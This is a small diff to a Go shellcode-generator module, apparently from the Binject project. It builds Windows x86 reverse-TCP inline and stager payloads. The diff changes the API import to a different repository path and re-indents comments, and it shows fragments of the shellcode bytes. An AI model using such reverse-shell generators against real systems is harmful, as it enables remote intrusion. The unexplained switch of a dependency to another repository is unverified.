@@ -3,7 +3,7 @@ package modules
 import (
 	"strings"
 
-	"github.com/Binject/shellcode/api"
+	"github.com/sanitycheck/binject-shellcode/api"
 )
 
 func init() {
@@ -154,7 +154,7 @@ func iat_reverse_tcp_inline_threaded_win_intel_32(params api.Parameters) ([]byte
 		"\x31\xd2" + // xor edx, edx
 		"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
 		"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
-		// entry point is now in edx
+	// entry point is now in edx
 
 	shellcode2 += "\xbb" // mov value below to EBX
 	var val uint32
@@ -362,7 +362,7 @@ func iat_reverse_tcp_stager_threaded_win_intel_32(params api.Parameters) ([]byte
 		"\x31\xd2" + // xor edx, edx
 		"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
 		"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
-		// entry point is now in edx
+	// entry point is now in edx
 	shellcode2 += "\xbb"
 	var val uint32 // mov value below to EBX
 	if LoadLibraryA-ImageBase < 0 {
@@ -439,7 +439,7 @@ func iat_reverse_tcp_stager_threaded_win_intel_32(params api.Parameters) ([]byte
 		"\x31\xd2" + // xor edx, edx
 		"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
 		"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
-		//entry point in EDX
+	//entry point in EDX
 
 	shellcode2 += "\xbb" // mov value below to EBX
 
